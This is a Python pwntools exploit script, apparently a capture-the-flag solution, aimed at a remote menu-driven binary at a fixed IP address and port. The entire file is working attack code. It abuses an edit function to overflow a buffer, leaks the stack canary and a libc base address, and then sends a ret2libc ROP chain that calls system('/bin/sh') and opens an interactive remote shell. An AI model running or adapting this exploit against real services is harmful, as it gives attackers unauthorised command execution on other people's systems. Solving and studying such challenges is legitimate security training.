from pwn import *

p = remote("15.165.12.135", 12345)
elf = ELF('/mnt/c/Users/Storm/ctf/deploy/prob')
libc = ELF('/mnt/c/Users/Storm/ctf/libc.so.6')

p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Enter article size : ", b'256')
p.sendlineafter(b"Write content : ", b'A' * 0x100)

p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Page number: ", b'4')
p.sendlineafter(b"Edit size: ", b'1')
p.sendafter(b"Write content : ", b'A' * 9)

p.sendlineafter(b"> ", b'2')
p.recvuntil(b'A' * 0x109)
canary = u64(b'\x00' + p.recv(7))
print(hex(canary))

p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Page number: ", b'4')
p.sendlineafter(b"Edit size: ", b'1')
p.sendafter(b"Write content : ", b'A' * 24)

p.sendlineafter(b"> ", b'2')
p.recvuntil(b'A' * 0x118)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x2a1ca
print(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x10f75b
ret_gadget = libc_base + 0x2882f

p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Page number: ", b'4')
p.sendlineafter(b"Edit size: ", b'1')

payload = b'A' * 0x8
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(ret_gadget)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.sendafter(b"Write content : ", payload)

p.sendlineafter(b"> ", b'4')

p.interactive()